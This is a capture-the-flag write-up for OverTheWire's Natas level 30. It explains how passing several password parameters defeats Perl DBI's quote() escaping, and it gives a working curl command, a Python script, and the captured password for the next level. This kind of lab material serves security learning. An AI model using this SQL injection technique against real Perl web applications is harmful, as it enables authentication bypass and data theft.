# Natas Level 30

> Username: natas30

> Password: frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF

> URL: http://natas30.natas.labs.overthewire.org

## Solution

Entering the URL, we found a login page. So let's view the source code to see if there is any vulnerability.

```perl
if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;
```

At first glance, this looks safe because `quote()` escapes SQL special characters.
The important distinction is that `param()` in list context can return multiple values.

The vulnerability comes from passing multiple values to DBI's `quote()` method, which can cause unexpected SQL construction depending on how the method is invoked.

the goal is to try sending a request with multiple password parameters rather than a conventional SQL injection string.

We can exploit this using `curl`.

```shell
curl http://natas30.natas.labs.overthewire.org/index.pl -u 'natas30:frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF' -X POST --data-urlencode 'username=natas31' --data-urlencode "password='whatever' or 1" --data-urlencode 'password=4'
```

Or also we can exploit it by writing a script.

```python
import requests

url = "http://natas30.natas.labs.overthewire.org/index.pl"

auth = (
    "natas30",
    "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF"
)

payload = {
    "username": "natas31",
    "password": ["'whatever' or 1", "4"]
}

response = requests.post(url, auth=auth, data=payload)

print(response.text)
```

```text
win!<br>here is your result:<br>natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
```

```text
aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1z
```

